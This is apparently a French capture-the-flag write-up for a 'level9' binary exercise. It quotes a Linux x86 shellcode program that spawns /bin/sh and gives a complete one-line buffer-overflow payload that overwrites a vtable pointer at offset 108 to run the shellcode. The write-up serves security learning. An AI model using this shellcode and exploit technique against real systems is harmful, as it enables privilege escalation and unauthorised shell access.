# level9

On va apprendre à faire des shellcodes: [Shellcoding in Linux (pdf)](https://www.exploit-db.com/docs/english/21013-shellcoding-in-linux.pdf)

On a ce tuto dans le pdf ci-dessus:
```c
/*shellprogram.c
Kerala Cyber Force – Ajin Abraham */

char code[] =
  "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89
  \x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\
  xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59";

int main(int argc, char **argv) {
  int (*exeshell)();

  exeshell = (int (*)()) code;
  (int)(*exeshell)();
}
```

```bash
$ gcc -fno-stack-protector -z execstack -no-pie -o coucou -m32 shellcode.c
```

And... It works !!!!

Notre `argv[1]` nous permet de faire un buffer overflow, on a un offset de **108**.

On souhaiterait réecrire l'adresse de la vtable, qui est déréférencé à l'appel de `operator+()`, pour executer notre shellcode. \
On ajoute à la fin du payload une adresse qui pointe vers l'endroit où trouve le pointeur qui pointe vers le début de notre payload \
Pour l'obtenir, on met un breakpoint après l'appel de `setAnnotation`, et en regardant la stack le pointeur que l'on cherche est stack+4

```bash
./level9 $(python -c 'print "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59" + ("A" * (108-55)) + "\x94\xf6\xff\xbf"')
```
